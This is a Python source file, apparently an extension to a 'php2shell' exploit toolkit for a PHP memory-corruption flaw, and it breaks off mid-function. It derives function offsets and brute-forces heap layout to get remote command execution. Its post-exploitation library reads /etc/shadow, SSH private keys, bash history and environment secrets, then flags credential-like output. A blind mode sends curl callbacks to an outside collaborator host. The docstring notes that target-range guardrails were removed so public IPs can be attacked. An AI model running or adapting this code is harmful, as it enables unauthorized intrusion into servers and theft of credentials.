#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
p2s_ext.py -- php2shell toolkit extension v2
=================================
Three subcommands that fix "the exploit stops working as soon as the PHP version/build changes":

  symbols   deterministically derive zif_system / zval_ptr_dtor offsets from the libphp.so **symbol table**
            (no version guessing, no distro lookup; supports a local file or auto-extraction inside a docker container),
            and emit a profile JSON skeleton.
  calibrate calibrate only the **allocator-related** unknowns (ht_size / htdata_offset / stage2_t);
            oracle = HTTP readback of the marker file after target-side command execution (version-independent objective evidence).
  postex    attack action library once RCE works (≤14B commands), per-action readback verification + artifact write-out +
            credential-clue aggregation.

Why two stages
  When the network side cannot read the remote .so directly, the version/distro only yields a "most likely";
  whereas the zif_system and zval_ptr_dtor offsets are **build-artifact properties**, fixed once you have the .so.
  The only thing left that truly needs trial and error is "where the 167-byte slot lands in the target allocator" -- that is the scope of calibration.
  Measured examples: PHP 8.2.12(bookworm) zif=0x398EC0 dtor=0x4807D0;
          PHP 8.4.26(trixie)  zif=0x465370 dtor=0x65EB60 -- same family, different builds, different offsets.

Hard command-length constraint
  The command zif_system receives is capped at 14 bytes (ht_size 167 - 0x98 - 1). All library commands are ≤14B,
  length is squeezed with globs (cat /etc/p*>p) and short redirections; no persistence/lateral-movement/anti-forensics actions are provided.

Guardrails
  Address-range validation has been removed: public IPs can be used as targets directly, and authorization responsibility rests with the user.
"""
import argparse
import io
import json
import os
import re
import subprocess
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
TOOL = os.path.join(HERE, "php2shell.py")
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, "..", "poc_eness"))

import php2shell_rce as R            # noqa: E402  (parse_target)
MAX_CMD = 14  # keeps the legacy default (ht_size=167)


def cmd_cap(prof):
    """Compute command capacity from the profile's ht_size: cap = ht_size - 0x98 - 1"""
    try:
        hs = int(prof.get("ht_size") or 167)
    except Exception:
        hs = 167
    return hs - 0x98 - 1

# Known-good baseline (bookworm / PHP 8.4.26 confirmed in practice; re-calibrate after a build change)
BASE_PROFILE = {
    "name": "bookworm-8.4.26",
    "ht_size": 167,
    "zif_offset": 0x465370,
    "dtor_offset": 0x65EB60,
    "htdata_offset": 0x690D8,
    "rounds": 8,
    "php_hint": "8.4.26",
}

def http_get(url, timeout=8.0):
    try:
        with urllib.request.urlopen(url, timeout=timeout, context=_ssl_ctx()) as r:
            return r.getcode(), r.read()
    except Exception as e:                       # noqa: BLE001
        return (getattr(e, "code", 0) or 0), b""


def hits(code, body, baseline=None, expect=None):
    """Objective oracle: 200 + non-empty + not soft-404 + optional content signature.

    Note: looking only at "200 and non-empty" is fooled by a site's soft 404 / fallback page; on real sites you must pass
    expect (e.g. uid=\\d+ for id) or compare against the response for a random non-existent path.
    """
    if code != 200 or not body:
        return False
    if b"Not Found" in body:
        return False
    if baseline and body.strip() == baseline.strip():
        return False
    if expect:
        pat = expect.encode() if isinstance(expect, str) else expect
        if not re.search(pat, body):
            return False
    return True


def soft404_baseline(url):
    """Fetch the 200 response body of a random non-existent path, used to detect a "site-wide 200" soft 404."""
    probe = url.rstrip("/") + "/p2s-nx-%d" % (int(time.time() * 1000) % 10 ** 8)
    code, body = http_get(probe)
    return body if code == 200 and body else b""


# ---------------- symbols ----------------
def readelf_symbols(path):
    out = subprocess.run(["readelf", "-sW", path], capture_output=True, text=True).stdout
    syms = {}
    for ln in out.splitlines():
        f = ln.split()
        if len(f) < 8:
            continue
        try:
            val = int(f[1], 16)
        except ValueError:
            continue
        name = f[7].split("@")[0]
        if name and val:
            syms[name] = val
    return syms


def do_symbols(a):
    path = a.elf
    if a.docker:
        cname, _, rel = a.docker.partition(":")
        rel = rel or "/usr/lib/apache2/modules/libphp.so"
        dst = os.path.join(os.getcwd(), "libphp_%s.so" % cname)
        cp = subprocess.run(["docker", "cp", f"{cname}:{rel}", dst],
                            capture_output=True, text=True)
        if cp.returncode != 0:
            print(f"[symbols] docker cp failed: {cp.stderr.strip()[:200]}")
            return 2
        path = dst
    if not path or not os.path.exists(path):
        print("[symbols] need --elf <libphp.so> or --docker <container[:path]>")
        return 2

    syms = readelf_symbols(path)
    zif = syms.get("zif_system")
    dtor = syms.get("zval_ptr_dtor")
    if zif is None or dtor is None:
        print("[symbols] zif_system / zval_ptr_dtor not found -- the binary may be stripped. "
              "Use a debug build with symbols, or fall back to a brute-force calibrate")
        return 4

    prof = dict(BASE_PROFILE)
    prof.update({"zif_offset": zif, "dtor_offset": dtor, "elf": path,
                 "name": os.path.basename(path).replace(".so", ""),
                 "calibrated": False, "source": "symbols:%s" % path})
    # Also read the version string, for archiving
    v = subprocess.run(["strings", "-a", path], capture_output=True, text=True).stdout
    # Take the "most frequent candidate" version string, not the first match: libphp embeds many third-party version strings, so the first match is often wrong
    cands = re.findall(r"PHP[/ ](\d+\.\d+\.\d+)", v or "")
    if cands:
        from collections import Counter
        cnt = Counter(cands)
        prof["php_hint"] = cnt.most_common(1)[0][0]
        print(f"[symbols] top3 version candidates: {cnt.most_common(3)}")

    print(f"[symbols] {path}")
    print(f"  zif_system    = {zif:#x}")
    print(f"  zval_ptr_dtor = {dtor:#x}")
    print(f"  php_hint      = {prof.get('php_hint', '?')}")
    if a.out:
        os.makedirs(os.path.dirname(os.path.abspath(a.out)), exist_ok=True)
        with open(a.out, "w", encoding="utf-8") as f:
            json.dump(prof, f, indent=2)
        print(f"[symbols] profile skeleton -> {a.out} (ht_size/htdata_offset still need a calibrate pass)")
    return 0


# ---------------- single exploitation run (reuses the CLI, avoids reimplementing the engine) ----------------
def cli_exploit(url, cmd, prof, rounds=1, timeout=90):
    args = [sys.executable, TOOL, "exploit", "-u", url, "-c", cmd,
            "--zif-offset", hex(prof["zif_offset"]),
            "--dtor-offset", hex(prof["dtor_offset"]),
            "--htdata-offset", hex(prof["htdata_offset"]),
            "--ht-size", str(prof["ht_size"]),
            "--timeout", "120",
            "--rounds", str(rounds)]
    for k, flag in (("stage1_n", "--stage1-n"), ("stage2_t", "--stage2-t")):
        if prof.get(k):
            args += [flag, str(prof[k])]
    try:
        p = subprocess.run(args, capture_output=True, text=True,
                           timeout=max(timeout, 600))
        return p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return ""


_MIN_CMD_LEN = 6   # measured: hit rate drops noticeably for commands <6B (tied to the forged HashTable size)


def _pad_cmd(cmd, outfile):
    """Pad an over-short forensics command to >=6B: lengthen the output filename, keeping the page readable."""
    if not outfile or not cmd.endswith(">" + outfile):
        return cmd, outfile
    need = _MIN_CMD_LEN - len(cmd.encode())
    if need <= 0:
        return cmd, outfile
    new_out = outfile + "x" * need
    return cmd[:len(cmd) - len(outfile)] + new_out, new_out


def attempt(url, prof, cmd, outfile, rounds=1, pause=0.6, tries=1,
            expect=None, baseline=None):
    """Retry automatically based on the readback: single-round success is measured at about 1/6, so multiple rounds + attempts are needed."""
    body, log = b"", ""
    cmd, outfile = _pad_cmd(cmd, outfile)
    if baseline is None:
        baseline = soft404_baseline(url)
    for _ in range(max(1, tries)):
        log = cli_exploit(url, cmd, prof, rounds=rounds)
        time.sleep(pause)
        code, body = http_get(url.rstrip("/") + "/" + outfile)
        if hits(code, body, baseline, expect):
            return True, body, log
    return False, body, log


# ---------------- command library (all ≤14 bytes) ----------------
LIB = [
    ("id",        "id>i",              "i",  "process identity"),
    ("whoami",    "whoami>w",          "w",  "user name"),
    ("uname",     "uname -a>u",        "u",  "kernel/distro fingerprint (prerequisite for privesc)"),
    ("hostname",  "hostname>hn",       "hn", "hostname/container id"),
    ("env",       "env>e",             "e",  "environment variables: DB/cloud AK/SK/proxy/token"),
    ("passwd",    "cat /etc/p*>p",     "p",  "/etc/passwd"),
    ("hosts",     "cat /etc/ho*>hs",   "hs", "/etc/hosts: internal network topology"),
    ("shadow",    "cat /etc/sh*>sh",   "sh", "/etc/shadow (requires root)"),
    ("ps",        "ps>ps",             "ps", "process table"),
    ("ip",        "ip a>ip",           "ip", "interfaces/subnets"),
    ("ss",        "ss -an>ss",         "ss", "listening ports"),
    ("lsroot",    "ls -l />lr",        "lr", "root directory permissions"),
    ("lsetc",     "ls /etc>le",        "le", "/etc listing"),
    ("lsrec",     "ls -R /var>lv",     "lv", "recursive /var: application config"),
    ("bashhist",  "cat ~/.b*>hb",      "hb", "bash history (often plaintext passwords)"),
    ("sshkey",    "cat ~/.ssh/*>sk",   "sk", "SSH private keys"),
    ("crontab",   "crontab -l>ct",     "ct", "scheduled tasks"),
    ("dockersock","ls /var/run>vr",    "vr", "whether docker.sock is mounted"),
    ("logs",      "cat /var/*/*>lg",   "lg", "log snippets (visibility check)"),
]




import json
import threading
import http.server


from urllib.parse import urlsplit

def _insecure():
    """--insecure / PHP2SHELL_INSECURE=1: skip certificate verification for https targets."""
    return os.environ.get("PHP2SHELL_INSECURE", "") == "1"


def _ssl_ctx():
    """Return an SSLContext that can be passed straight to urlopen(context=...); None when insecure is off."""
    if not _insecure():
        return None
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def requests_get(url, timeout=10, **kw):
    import requests as _rq
    if _insecure():
        kw.setdefault("verify", False)
        try:  # silence InsecureRequestWarning noise when verification is skipped
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass
    return _rq.get(url, timeout=timeout, **kw)


HITS = []           # out-of-band callback hit log



def load_profile(a):
    """Start from BASE_PROFILE and assemble the profile with --profile / CLI overrides."""
    prof = dict(BASE_PROFILE)
    path = getattr(a, "profile", None)
    if path:
        try:
            prof.update(json.load(open(path, encoding="utf-8")))
            print(f"[*] loaded profile: {path}")
        except Exception as e:
            print(f"[!] failed to read profile: {e}")
    for key, attr in (("ht_size", "ht_size"), ("zif_offset", "zif_offset"),
                      ("dtor_offset", "dtor_offset"), ("htdata_offset", "htdata_offset"),
                      ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
        v = getattr(a, attr, None)
        if v is not None:
            prof[key] = v
    return prof


class _CB(http.server.BaseHTTPRequestHandler):
    def _h(self):
        HITS.append({"t": time.time(), "path": self.path,
                     "ua": self.headers.get("User-Agent", ""),
                     "ip": self.client_address[0]})
        body = b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = _h
    do_POST = _h

    def log_message(self, *a):
        pass


def start_listener(port):
    http.server.ThreadingHTTPServer.allow_reuse_address = True
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), _CB)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    # self-check: confirm this process really receives connections (otherwise every later miss is a false negative)
    try:
        import urllib.request
        urllib.request.urlopen(f"http://127.0.0.1:{port}/__selfcheck", timeout=3).read()
        ok = any(h["path"] == "/__selfcheck" for h in HITS)
        print("[*] listener self-check: " + ("passed" if ok else "failed (port taken by another process)"))
        if not ok:
            raise OSError("listener self-check failed")
    except Exception as e:
        raise OSError(f"self-check: {e}")
    return srv


# ---------------- read-only fingerprinting (does not trigger OOM) ----------------
def do_fingerprint(a):
    base = a.url.rstrip("/")
    ver = None
    seen = {}
    paths = ["/", "/index.php", "/phpinfo.php", "/info.php", "/test.php"]
    for p in paths[: max(1, a.max_paths)]:
        try:
            code, body = http_get(base + p, timeout=a.timeout)
        except Exception:
            continue
        seen[p] = code
        m = re.search(rb"PHP/(\d+\.\d+\.\d+)", body) or re.search(rb"PHP Version (\d+\.\d+\.\d+)", body)
        if m:
            ver = m.group(1).decode()
            print(f"[+] {p} leaks the version: PHP/{ver}")
            break
        if code == 200 and p != "/":
            print(f"[*] {p} = 200 ({len(body)}B)")
    print("[*] path probe results: " + ", ".join(f"{k}={v}" for k, v in seen.items()))
    # Every probed path is unresponsive (connection refused / TLS verification failure / timeout) => unreachable, never report LIKELY_RCE again
    if not seen or all((c or 0) <= 0 for c in seen.values()):
        print("[-] unreachable: all path probes got no response (connection failure/timeout/TLS verification failure).")
        if not _insecure():
            print("    If the https target has a self-signed or expired certificate, retry with --insecure (strict verification is the default).")
        return 50
    # ---- condition 3: read-only probe of the session sink (does not trigger OOM) ----
    sink_names = []
    for p in paths[: max(1, a.max_paths)]:
        try:
            rr = requests_get(base + p, timeout=a.timeout)
        except Exception:
            continue
        raw_ck = rr.headers.get("Set-Cookie") or ""
        for kv in raw_ck.split(","):
            nm = kv.strip().split("=")[0].strip()
            if nm and nm not in sink_names:
                sink_names.append(nm)
    if sink_names:
        print("[+] condition 3 session sink: likely present (Set-Cookie: " + ", ".join(sink_names[:4]) + ")")
    else:
        print("[-] condition 3 session sink: not detected (zero Set-Cookie on probed paths -> no script calls session_start();"
              "109618 has no dangling sink)")
    # header fingerprint
    try:
        r = requests_get(base + "/", timeout=a.timeout)
        print(f"[*] Server: {r.headers.get('Server','-')} | X-Powered-By: {r.headers.get('X-Powered-By','-')}")
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", r.headers.get("X-Powered-By", ""))
        if m and not ver:
            ver = m.group(1)
    except Exception as e:
        print(f"[!] failed to fetch headers: {e}")
    if not ver:
        print("[!] no version obtained: the target hides its version. Decide from component intel / response differences; do not go straight for the OOM (it causes DoS)")
        return 10
    print(f"[+] determined version: PHP {ver}")
    parts = [int(x) for x in ver.split(".")][:3]
    vuln = {"8.2": (8, 2, 35), "8.3": (8, 3, 36), "8.4": (8, 4, 27), "8.5": (8, 5, 12)}
    key = f"{parts[0]}.{parts[1]}"
    if key in vuln:
        lim = vuln[key]
        if tuple(parts) < lim:
            print(f"[+] AFFECTED: {ver} < {'.'.join(map(str,lim))} (109618 affected range)")
            print("    Whether RCE works depends on the config: post_max_size > memory_limit and a session_start sink present")
            if not sink_names:
                print("    [!] no Set-Cookie detected: if other entry points also lack session_start(), 109618 has no dangling sink")
            return 0
        print(f"[-] PATCHED: {ver} >= {'.'.join(map(str,lim))}")
        return 30
    print(f"[?] {ver} is not in the known matrix: decide via the symbol-derivation + calibration flow")
    return 10


# ---------------- blind verification: out-of-band callback, no readback channel needed ----------------
def do_blind(a):
    prof = load_profile(a)
    cap = cmd_cap(prof)
    collab = a.collab
    cands = []
    for tmpl in (f"curl {collab}/{a.token}", f"curl {collab}", f"getent hosts {collab}"):
        if len(tmpl) <= cap:
            cands.append(tmpl)
    if not cands:
        print(f"[!] every callback command exceeds capacity cap={cap}B (collab needs a short domain/short IP)")
        print(f"    Example: with cap=14 you can use `curl h:9000/p1` (14B); for long domains raise ht_size first or find another channel on the target")
        return 2
    payload = cands[0]
    print(f"[*] callback command: {payload!r} ({len(payload)}B / cap {cap}B)")
    print(f"[*] target: {a.url}  ht_size={prof['ht_size']} htdata={hex(prof['htdata_offset'])}")

    srv = None
    if a.listen:
        try:
            srv = start_listener(getattr(a, "listen_port", 9000))
            print(f"[*] local callback listener: 0.0.0.0:{a.listen_port} (waiting for target outbound connection)")
        except OSError as e:
            print(f"[!] failed to listen on {a.listen_port} ({e}); sending continues but no local evidence, use an external collaborator")
            a.listen = False

    base = len(HITS)
    t0 = time.time()
    # Multi-round retries inside one process hit far more often than "a new connection every round"; always hand it to exploit in one go
    cli_exploit(a.url, payload, prof, rounds=max(1, a.rounds), timeout=a.timeout)
    deadline = time.time() + a.wait
    while time.time() < deadline and len(HITS) == base:
        time.sleep(1)
    new = HITS[base:]
    if srv:
        srv.shutdown()
    if new:
        for h in new:
            print(f"[+] callback hit: {time.strftime('%H:%M:%S', time.localtime(h['t']))} "
                  f"from {h['ip']} path={h['path']} ua={h['ua'][:48]!r}")
        print("[+] verdict: command execution confirmed (the target connected out to the collaborator, no readback channel needed)")
        return 0
    print(f"[-] no callback within {int(time.time()-t0)}s. Possible: command not executed / no egress from the target / "
          f"curl missing / capacity too small / preconditions unmet")
    print("    Next: switch to a timing side channel (compare response times) or ask to inspect logs on the target; do not create a DoS by blindly adding rounds")
    return 10

# ---------------- calibrate ----------------
def sweep(lo, hi, step):
    v = lo
    while v <= hi:
        yield v
        v += step


def do_calibrate(a):
    if getattr(a, "collab", None):
        return _calibrate_collab(a)
    host, port, path = R.parse_target(a.url)

    prof = dict(BASE_PROFILE)
    if a.profile:
        with open(a.profile, encoding="utf-8") as f:
            prof.update(json.load(f))
    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset",
              "stage1_n", "stage2_t"):
        v = getattr(a, k, None)
        if v is not None:
            prof[k] = v

    hts = ([a.ht_size] if a.ht_size else
           list(sweep(a.ht_size_lo, a.ht_size_hi, a.ht_size_step)))
    if a.htdata_window:
        lo, hi = [int(x, 0) for x in a.htdata_window.split(":")]
        hds = list(sweep(lo, hi, a.htdata_step))
    else:
        hds = [prof["htdata_offset"]]

    total = len(hts) * len(hds)
    print(f"[calibrate] {a.url} zif={prof['zif_offset']:#x} dtor={prof['dtor_offset']:#x} "
          f"ht_size={hts} htdata={len(hds)} values, {total} combinations in total rounds={a.rounds}")
    n = 0
    t0 = time.time()
    for hs in hts:
        for hd in hds:
            n += 1
            cand = dict(prof, ht_size=hs, htdata_offset=hd)
            tag = f"k{n}"
            print(f"  [{n}/{total}] hs={hs} htdata={hd:#x} ... ", end="", flush=True)
            if getattr(a, "dir", None):
                # absolute directory channel: independent of cwd, the oracle reads the locally mapped directory
                real = f"id>{a.dir.rstrip('/')}/{tag}"
                if len(real) > cmd_cap(cand):
                    print(f"SKIP(>{cmd_cap(cand)}B)")
                    continue
                ok, body, log = False, b"", ""
                try:
                    os.remove(os.path.join(a.local_dir or "", tag))
                except OSError:
                    pass
                for _ in range(max(1, a.tries)):
                    log = cli_exploit(a.url, real, cand, rounds=a.rounds)
                    time.sleep(a.pause)
                    fp = os.path.join(a.local_dir or "", tag)
                    if os.path.exists(fp):
                        body = open(fp, "rb").read()
                        if body:
                            ok = True
                            break
            else:
                ok, body, log = attempt(a.url, cand, f"id>{tag}", tag, rounds=a.rounds,
                                        tries=a.tries, expect=rb"uid=\d+")
            if ok:
                cand.update({"name": f"cal-{host.replace('.', '-')}-{hs}",
                             "calibrated": True,
                             "source": "calibrate:%s" % a.url,
                             "php_hint": body.decode("utf-8", "replace").strip()[:80]})
                out = a.out or os.path.join(os.path.dirname(HERE), "profiles",
                                            f"{host.replace('.', '_')}_{port}_{hs}.json")
                os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
                with open(out, "w", encoding="utf-8") as f:
                    json.dump(cand, f, indent=2)
                print(f"HIT → {out}")
                print(f"[calibrate] HIT ht_size={hs} htdata={hd:#x}; readback={cand['php_hint']};"
                      f" elapsed {time.time() - t0:.1f}s")
                return 0
            st3 = "stage3" if "Stage-3" in log else ("stage2" if "Stage-2" in log else "stage1")
            print(f"miss({st3})")
    print(f"[calibrate] all {total} combinations failed ({time.time() - t0:.1f}s);"
          f" widen --htdata-window / --ht-size-* or correct zif/dtor with symbols first")
    return 15



def _calibrate_collab(a):
    """Use an out-of-band callback as the oracle: a candidate succeeds when the listener receives a request with that candidate's tag.
    Suited to real targets (no writable directory/no readback channel); the cost is one OOM chain round per candidate."""
    cap = cmd_cap({"ht_size": a.ht_size})
    try:
        srv = start_listener(getattr(a, "listen_port", 9000))
    except OSError as e:
        print(f"[!] listen failed: {e}")
        return 2
    print(f"[*] callback oracle listening on 0.0.0.0:{getattr(a, 'listen_port', 9000)}; cap={cap}B")
    prof = dict(BASE_PROFILE)
    prof.update({"ht_size": a.ht_size,
                 "zif_offset": a.zif_offset or BASE_PROFILE["zif_offset"],
                 "dtor_offset": a.dtor_offset or BASE_PROFILE["dtor_offset"]})
    if getattr(a, "stage1_n", None):
        prof["stage1_n"] = a.stage1_n
    if a.stage2_t:
        prof["stage2_t"] = a.stage2_t
    win = a.htdata_window or "0x68000:0x6A000"
    start, end = [int(x, 0) for x in str(win).split(":")]
    step = int(a.htdata_step or 0x100, 0) if isinstance(a.htdata_step, str) else (a.htdata_step or 0x100)
    off = start
    idx = 0
    hits = []
    while off <= end:
        tag = f"c{idx%10}{idx//10}"[:2] if cap >= 9 else f"{idx}"[-1]
        cmd = f"curl {a.collab}/{tag}"
        if len(cmd) > cap:
            print(f"[!] callback command {cmd!r} exceeds capacity {cap}B: use a shorter collab/tag")
            srv.shutdown()
            return 2
        prof["htdata_offset"] = off
        base = len(HITS)
        print(f"[*] candidate htdata={hex(off)} tag={tag} cmd={cmd!r}", end=" ", flush=True)
        cli_exploit(a.url, cmd, prof, rounds=max(1, a.rounds),
                    timeout=getattr(a, "timeout", 120))
        dl = time.time() + 6
        while time.time() < dl and len(HITS) == base:
            time.sleep(1)
        got = [h for h in HITS[base:] if tag in h["path"]]
        if got:
            print("HIT")
            print(f"[+] calibration succeeded: ht_size={a.ht_size} htdata_offset={hex(off)} "
                  f"(callback {got[0]['path']} from {got[0]['ip']})")
            hits.append(off)
            pdir = "profiles"
            try:
                os.makedirs(pdir, exist_ok=True)
                host = urlsplit(a.url).hostname
                port = urlsplit(a.url).port or 80
                out = a.out or os.path.join(pdir, f"{host}_{port}_{a.ht_size}.json")
                json.dump({"ht_size": a.ht_size, "htdata_offset": off,
                           "zif_offset": prof["zif_offset"], "dtor_offset": prof["dtor_offset"],
                           "stage1_n": prof.get("stage1_n"),
                           "stage2_t": prof.get("stage2_t"), "url": a.url,
                           "calibrated": True, "oracle": "oob-callback"},
                          open(out, "w"), indent=2)
                print(f"[*] profile written to {out}")
            except Exception as e:
                print(f"[!] failed to write profile: {e}")
            break
        print("miss")
        idx += 1
        off += step
    srv.shutdown()
    return 0 if hits else 20

# ---------------- postex ----------------
CRED_PAT = re.compile(
    rb"(?i)(passw|secret|token|api[_-]?key|access[_-]?key|aws_|AKIA|database_url|"
    rb"mysql|redis|smtp|private[_-]?key|BEGIN [A-Z ]*PRIVATE KEY)")


def do_postex(a):
    host, port, path = R.parse_target(a.url)

    prof = dict(BASE_PROFILE)
    if a.profile:
        with open(a.profile, encoding="utf-8") as f:
            prof.update(json.load(f))
    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset",
              "stage1_n", "stage2_t"):
        v = getattr(a, k, None)
        if v is not None:
            prof[k] = v

    channel_dir = (a.dir or "").rstrip("/")
    local_dir = a.local_dir
    if channel_dir and not local_dir:
        print("[postex] --dir also requires --local-dir (to read back the same directory as mapped on the host/this machine)")
        return 2

    only = set(x.strip() for x in a.only.split(",")) if a.only else None
    items = [it for it in LIB if (only is None or it[0] in only)]
    outdir = a.outdir or os.path.join(os.getcwd(), "postex_out")
    os.makedirs(outdir, exist_ok=True)

    print(f"[postex] {a.url} profile={prof.get('name')} ht_size={prof['ht_size']} "
          f"htdata={prof['htdata_offset']:#x} {len(items)} commands -> {outdir}")
    rows, creds = [], []
    for key, cmd, outf, desc in items:
        cap = cmd_cap(prof)
        if channel_dir:
            # absolute directory channel: the command writes <dir>/<outf>, readback reads the local <local_dir>/<outf>
            real_cmd = cmd.replace(">" + outf, ">" + channel_dir + "/" + outf, 1)
            if len(real_cmd) > cap:
                print(f"  {key:<10} {real_cmd:<18} ... SKIP(>{cap}B)")
                rows.append({"key": key, "cmd": real_cmd, "desc": desc,
                             "status": "SKIP_TOO_LONG", "bytes": 0, "file": None})
                continue
        else:
            real_cmd = cmd
        print(f"  {key:<10} {real_cmd:<18} ... ", end="", flush=True)
        if channel_dir:
            ok, body = False, b""
            fp = os.path.join(local_dir, outf)
            try:
                os.remove(fp)          # clear leftovers first, so an old file cannot cause a false hit
            except OSError:
                pass
            for _ in range(max(1, a.tries)):
                cli_exploit(a.url, real_cmd, prof, rounds=a.rounds)
                time.sleep(a.pause)
                if os.path.exists(fp):
                    body = open(fp, "rb").read()
                    ok = True
                    break
        else:
            ok, body, _ = attempt(a.url, prof, real_cmd, outf, rounds=a.rounds,
                                  pause=a.pause, tries=a.tries)
        if ok:
            with open(os.path.join(outdir, key), "wb") as f:
                f.write(body)
            tag = f"OK {len(body)}B"
            if CRED_PAT.search(body):
                tag += " !credential clue"
                creds.append(key)
            print(tag)
            rows.append({"key": key, "cmd": cmd, "desc": desc, "status": "OK",
                         "bytes": len(body), "file": os.path.join(outdir, key)})
        else:
            print("no-effect")
            rows.append({"key": key, "cmd": cmd, "desc": desc,
                         "status": "NO_EFFECT", "bytes": 0, "file": None})

    rp = os.path.join(outdir, "report.json")
    with open(rp, "w", encoding="utf-8") as f:
        json.dump({"target": a.url, "profile": prof, "results": rows,
                   "credential_like": creds,
                   "ts": time.strftime("%Y-%m-%dT%H:%M:%S")}, f, indent=2, ensure_ascii=False)
    good = [r for r in rows if r["status"] == "OK"]
    print(f"\n[postex] succeeded {len(good)}/{len(rows)}; report {rp}")
    if creds:
        print(f"[postex] credential-like clues found in: {', '.join(creds)}")
    if a.cleanup:
        names = [it[2] for it in items]
        for i in range(0, len(names), 3):
            cli_exploit(a.url, "rm " + " ".join(names[i:i + 3]), prof, rounds=1)
            time.sleep(a.pause)
        print("[postex] cleanup delivered (rm in batches, ≤14B)")
    return 0 if good else 20


# ---------------------------------------------------------------- oneclick
# Known-build profile DB: keys are PHP version strings. A hit means no manual parameters.
PROFILE_DB = {
    "8.4.26": dict(ht_size=167, htdata_offset=0x690D8, zif_offset=0x465370,
                   dtor_offset=0x65EB60, stage2_t=406, rce_ok=True,
                   label="php:8.4.26-apache (Debian trixie) RCE confirmed in practice, cap=14B"),
    "8.2.12": dict(ht_size=167, htdata_offset=0x690D8, zif_offset=0x398EC0,
                   dtor_offset=0x4807D0, stage2_t=406, rce_ok=False,
                   label="PHP 8.2.12(NTS) in practice the Stage-1 leak always fails -> only DoS is provable"),
}


# ---------------- external profile store (profiles.json) ----------------
# Search order: bundled profiles.json -> ~/.php2shell/profiles.json -> ./profiles.json
# Format example:
# {"8.2.34": {"ht_size":167, "htdata_offset":"0x690D8", "zif_offset":"0x398EC0",
#             "dtor_offset":"0x4807D0", "stage2_t":406, "rce_ok":false, "label":"..."}}
_PROFILE_STORES = [
    os.path.join(HERE, "profiles.json"),
    os.path.expanduser("~/.php2shell/profiles.json"),
    "profiles.json",
]


def _coerce_profile(prof):
    """Convert string hex values in the JSON to int, keeping the same shape as the built-in profiles."""
    out = dict(prof)
    for k in ("htdata_offset", "zif_offset", "dtor_offset"):
        v = out.get(k)
        if isinstance(v, str):
            try:
                out[k] = int(v, 0)
            except Exception:
                pass
    if "ht_size" in out:
        try:
            out["ht_size"] = int(out["ht_size"])
        except Exception:
            pass
    if "stage2_t" in out:
        try:
            out["stage2_t"] = int(out["stage2_t"])
        except Exception:
            pass
    out.setdefault("rce_ok", True)
    return out


def import_profile_store(verbose=False):
    """Merge the external profiles.json into PROFILE_DB; built-in versions win (never overwritten)."""
    added = 0
    for path in _PROFILE_STORES:
        try:
            if not os.path.isfile(path):
                continue
            with open(path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if not isinstance(data, dict):
                if verbose:
                    print(f"[!] profiles.json top level is not an object: {path}")
                continue
            for ver, prof in data.items():
                ver = str(ver).strip()
                if not isinstance(prof, dict):
                    continue
                if ver in PROFILE_DB:
                    if verbose:
                        print(f"[*] profiles.json: {ver} is built in, skipping ({path})")
                    continue
                p = _coerce_profile(prof)
                p.setdefault("label", "profiles.json:%s" % ver)
                PROFILE_DB[ver] = p
                added += 1
                if verbose:
                    print(f"[+] profiles.json: loaded profile {ver} ({path})")
        except Exception as e:
            if verbose:
                print(f"[!] failed to read profiles.json {path}: {e}")
            continue
    if verbose and added:
        print(f"[*] profiles.json added {added} profiles in total")
    return added


def _ver_key(v):
    m = re.match(r"(\d+\.\d+\.\d+)", (v or "").strip())
    return m.group(1) if m else None


FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}


def _is_patched(ver):
    """Decide whether it is already patched using the official fixed-version matrix."""
    k = _ver_key(ver)
    if not k:
        return False
    mm, pp = k.split(".")[0] + "." + k.split(".")[1], int(k.split(".")[2])
    fx = FIXED.get(mm)
    return bool(fx is not None and pp >= fx)


def _http_get(url, timeout=20, headers=None):
    """Minimal GET (used for readback from real targets, no third-party deps). Returns None on failure."""
    try:
        import urllib.request
        req = urllib.request.Request(url, headers=headers or {
            "User-Agent": "Mozilla/5.0 (compatible; php2shell-verify)",
            "Cache-Control": "no-cache",
        })
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.read().decode("utf-8", "replace")
    except Exception:
        return None


def _run(cmd, timeout=1800):
    """Run a subprocess, return (rc, out+err)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "[timeout] %s" % " ".join(cmd)
    except Exception as e:
        return 125, "[err] %s" % e


def _load_json(p):
    try:
        with io.open(p, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _pick_profile(scan, a):
    """Profile priority: --profile > PROFILE_DB (by version) > explicit CLI overrides."""
    prof = dict(BASE_PROFILE)
    src = "base"
    if getattr(a, "profile", None):
        p2 = _load_json(a.profile) or {}
        if p2:
            prof.update({k: v for k, v in p2.items() if v is not None})
        src = "file:%s" % a.profile
        if p2.get("calibrated") is False:
            prof["_needs_cal"] = True
    else:
        k = _ver_key((scan or {}).get("php_version"))
        pid = PROFILE_DB.get(k) if k else None
        if pid:
            prof.update({kk: vv for kk, vv in pid.items() if kk not in ("rce_ok", "label")})
            src = "db:%s" % k
            prof["_db_rce_ok"] = pid.get("rce_ok", True)
            prof["_db_label"] = pid.get("label", "")
    for k2, ak in (("ht_size", "ht_size"), ("htdata_offset", "htdata_offset"),
                   ("zif_offset", "zif_offset"), ("dtor_offset", "dtor_offset"),
                   ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
        v = getattr(a, ak, None)
        if v is not None:
            prof[k2] = v
